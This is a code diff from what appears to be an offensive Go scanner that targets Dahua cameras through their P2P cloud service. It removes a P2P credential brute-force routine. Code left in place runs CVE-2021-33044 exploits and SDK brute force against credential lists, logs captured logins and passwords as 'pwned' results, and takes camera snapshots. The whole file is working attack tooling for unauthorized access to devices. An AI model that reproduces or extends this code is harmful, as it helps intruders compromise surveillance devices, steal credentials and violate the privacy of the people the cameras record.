@@ -157,23 +157,6 @@ func (s *Scanner) Run() {
 					err := client.Handshake()
 					if err != nil {
 						client.Close()
-						if p2p.IsChannelAuthRequired(err) {
-							if s.Config.Pwn.Methods["brute"] && len(s.Config.Brute.Credentials) > 0 {
-								for _, cred := range s.Config.Brute.Credentials {
-									authClient := p2p.NewDHClient(serial, false)
-									authClient.SetRetries(1)
-									authClient.SetDeviceAuth(cred.Login, cred.Password, "")
-									authErr := authClient.Handshake()
-									if authErr == nil {
-										finalClient = authClient
-										ok = true
-										break
-									}
-									authClient.Close()
-								}
-							}
-							break
-						}
 						continue
 					}
 					finalClient = client
@@ -322,44 +305,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		}
 	}
 
-	if client.IsPwnedAuth() {
-		user, pass, _, _ := client.GetDeviceAuth()
-		tunnel.SetAuth(user, pass)
-		model, channels, _, err := tunnel.GetDeviceInfo()
-		if err != nil || model == "" {
-			sdk := p2p.NewSDKClient(tunnel, user, pass)
-			if _, m, ch, sErr := sdk.GetDeviceInfo(); sErr == nil {
-				if m != "" {
-					model = m
-				}
-				if ch > 0 {
-					channels = ch
-				}
-			}
-		}
-		if model == "" {
-			model = "Dahua Device"
-		}
-		if channels == 0 {
-			channels = 1
-		}
-		res := &ExploitResult{
-			Method:   "P2P Auth Brute",
-			Login:    user,
-			Password: pass,
-			Model:    model,
-			Channels: channels,
-			IP:       ip,
-		}
-		s.handlePwned(serial, res)
-		if !s.launchSnapshot(serial, res) {
-			s.mu.Lock()
-			s.CompletedCount++
-			s.mu.Unlock()
-		}
-		return
-	}
-
+	// 1. CVE exploits
 	if s.Config.Pwn.Protocol["cgi"] {
 		if s.Config.Pwn.Methods["cve-2021-33044"] {
 			res, err := TryCVE2021_33044(tunnel)
@@ -426,17 +372,18 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		}
 	}
 
+	// 2. SDK Brute
 	if s.Config.Pwn.Protocol["sdk"] && s.Config.Pwn.Methods["brute"] {
 		res, err := TryBruteForceSDK(tunnel, s.Config.Brute.Credentials)
 		if err == nil && res != nil {
-				res.IP = ip
-				s.handlePwned(serial, res)
-				if !s.launchSnapshot(serial, res) {
-					s.mu.Lock()
-					s.CompletedCount++
-					s.mu.Unlock()
-				}
-				return
+			res.IP = ip
+			s.handlePwned(serial, res)
+			if !s.launchSnapshot(serial, res) {
+				s.mu.Lock()
+				s.CompletedCount++
+				s.mu.Unlock()
+			}
+			return
 		}
 	}
 
@@ -476,17 +423,7 @@ func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
 			client.SetRetries(retries)
 			if err := client.Handshake(); err != nil {
 				client.Close()
-				if p2p.IsChannelAuthRequired(err) && login != "" && password != "" {
-					client = p2p.NewDHClient(serial, false)
-					client.SetRetries(retries)
-					client.SetDeviceAuth(login, password, "")
-					if err := client.Handshake(); err != nil {
-						client.Close()
-						continue
-					}
-				} else {
-					continue
-				}
+				continue
 			}
 			if err := client.PTCPHandshake(); err != nil {
 				client.Close()
@@ -562,8 +499,6 @@ func formatVulnLabel(method string) string {
 		return "CGI Brute"
 	case "Brute Force (SDK)":
 		return "SDK Brute"
-	case "P2P Auth Brute":
-		return "P2P Brute"
 	default:
 		return method
 	}
